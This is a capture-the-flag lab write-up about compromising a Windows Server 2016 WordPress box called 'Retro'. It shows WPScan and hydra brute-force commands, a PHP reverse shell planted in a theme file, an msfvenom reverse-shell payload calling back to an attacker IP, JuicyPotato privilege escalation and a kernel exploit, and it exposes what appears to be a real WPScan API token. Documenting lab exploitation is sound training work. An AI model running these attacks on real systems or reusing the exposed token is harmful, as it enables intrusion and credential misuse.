---
title: "Retro"
description: "InfoGath Nmap : Port 80 Dirsearch : we identified that the apps is using Wordpress, so let’s we scan it using WPScan. Exploit Wordpress WPScan : let’s we do bruteforce attack"
lang: "en"
translationKey: "retro"
category: "lab-writeups"
tags: ["Lab", "Wordpress", "Juicy Potato", "CVE-2017-0213", "Windows server 2016", "OS Version:                10.0.14393 N/A Build 14393", "Windows"]
publishDate: "2025-01-08"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "1755fca1-ed80-809c-9a80-d189e93a31be"
notionUrl: "https://app.notion.com/p/Retro-1755fca1ed80809c9a80d189e93a31be"
notionLastEdited: "2025-06-08T13:28:00.000Z"
---

# InfoGath

Nmap :

![](/images/retro/ee4f24b09058.png)

## Port 80

![](/images/retro/457c70ab1c67.png)

Dirsearch :

![](/images/retro/b6b3f5fe6e1e.png)

![](/images/retro/23adbc6b31b9.png)

we identified that the apps is using Wordpress, so let’s we scan it using WPScan.

# Exploit Wordpress

WPScan :

```bash
wpscan --url http://10.10.122.119/retro/ -eu --api-token HgrZozFw3YMdEMsOCxIWuKSZtsaGSti6l7qi4iLsaI0
```

![](/images/retro/eee20f016290.png)

let’s we do bruteforce attack login page using user **wade, **we found login page in the bottom of the main page.

![](/images/retro/37e22fa95000.png)

![](/images/retro/5ed9ebe4d5e0.png)

```bash
wpscan --url http://10.10.122.119/retro/wp-login.php -U wade -P /usr/share/wordlists/rockyou.txt 
# cause wpscan take too long so i switch the tool using hydra
hydra -l wade -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt 10.10.122.119 -V http-post-form "/retro/wp-login.php:log=Wade&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fretro%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
```

![](/images/retro/14bdd120dd0e.png)

yey we got a valid credential `wade : parzival`, let’s we use it for login into wordpress.

![](/images/retro/43bb7faeaca9.png)

go to **theme editor **edit file 404.php become a `ivan sincek revshell` then accessing the page [`/wp-content/themes/90sretro/404.php`](http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php) to trigger revshell.

![](/images/retro/5da059ce0b4c.png)

![](/images/retro/c49315c863b8.png)

oke after getting revshell and doing some enumeration our user retro in a revshell doesn’t have any write permission on any files in the system so i look for another ways.

I tried to reused my credentials which I got in previous step when we login into Wordpress (`wade:parzival`) on RDP session.

![](/images/retro/9695f22f8f5f.png)

then voila we got session on rdp as wade and got a flag.

oke we got 2 users, wade and retro, let’s we do enumerate one by one

# WinPriv

## **Privesc SeImpersonate Using JuicyPotato**

on user `iis apppool\retro` we got SeImpersonatePrivilege but we can’t save our exploit script on any directory on our targeted system so we make our own directory on `C:\` directory.

![](/images/retro/06fc1b22ec70.png)

**Option 1 juicy potato**

first we transfer our juicy potato and our malicious revshell.exe

```bash
# our revshell is generate using msfvenom like the following
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.17.49.139 lport=82 -f exe -o shell-thm.exe
```

![](/images/retro/96ef7b5d4026.png)

Then running the juicy potato voila we got authority user like this.

```bash
.\juicy.exe -t * -p .\shell.exe -l 82
```

![](/images/retro/ebb5bfcb3b2b.png)

**Options 2 juicy potato**

```bash
.\juicy.exe -l 443 -p shell.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

![](/images/retro/d2f8b2511b1d.png)

## Kernel Exploit

on user **Wade** running `systeminfo` command.

```bash
Host Name:                 RETROWEB
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00377-60000-00000-AA325
Original Install Date:     12/8/2019, 10:50:43 PM
System Boot Time:          6/7/2025, 6:29:17 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,251 MB
Virtual Memory: Max Size:  3,200 MB
Virtual Memory: Available: 2,322 MB
Virtual Memory: In Use:    878 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: KB3192137
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.228.40
                                 [02]: fe80::a010:32a5:bfeb:acea
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

we notice that our kernel is (Build 14393) windows server 2016 standard which is vulnerable let’s we do enumerate the vulnerable.

![](/images/retro/2f6f105d5e0d.png)

Following our research on [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits), we found a privilege escalation method for our Windows 2016 machine over on github by SecWiki.

![](/images/retro/49ea384f5175.png)

oke now let’s we deliver the exploit into the target. Then running the exploit script

![](/images/retro/10526a627625.png)

voila we got administrator user now.

![](/images/retro/5cf0846e1cf0.png)

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
